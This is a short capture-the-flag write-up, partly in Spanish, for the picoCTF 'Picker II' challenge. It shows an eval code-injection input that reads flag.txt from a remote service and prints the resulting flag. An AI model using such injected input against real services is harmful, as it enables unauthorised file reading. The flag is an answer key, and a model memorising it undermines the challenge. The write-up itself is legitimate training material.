### Picker II
### Descripcion
Can you figure out how this program works to get the flag?

Connect to the program with netcat:

`$ nc saturn.picoctf.net 61291`

The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/523/picker-II.py).

### Solucion
como eval ejecuta el string como si fuera codigo python lo unico que pase por el input fue un open para abrir el archivo de la bandera y un print para que me lo mostrara a mi.

```
┌──(kali㉿kali)-[~/reversing2/2picker]
└─$ nc saturn.picoctf.net 55518
==> print(open('flag.txt').read())
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}

```

picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
### Notas adicionales

### Referencias